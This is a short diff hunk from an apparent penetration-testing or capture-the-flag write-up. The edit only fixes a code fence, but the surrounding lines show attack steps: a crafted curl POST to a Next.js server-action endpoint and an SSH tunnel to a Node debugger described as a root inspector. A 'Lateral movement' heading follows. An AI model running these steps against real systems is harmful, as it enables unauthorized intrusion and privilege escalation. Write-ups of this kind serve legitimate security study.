@@ -41,7 +41,8 @@ curl -X POST http://<IP>:3000/ -H 'Next-Action: <ACTION>' \
   -H 'Content-Type: multipart/form-data; boundary=----R2S' --data-binary @r2s-body.txt
 # root inspector
 ssh -L 9229:localhost:9229 engineer@<IP>
-node inspect 127.0.0.1:9229```
+node inspect 127.0.0.1:9229
+```
 
 ## Lateral movement
 
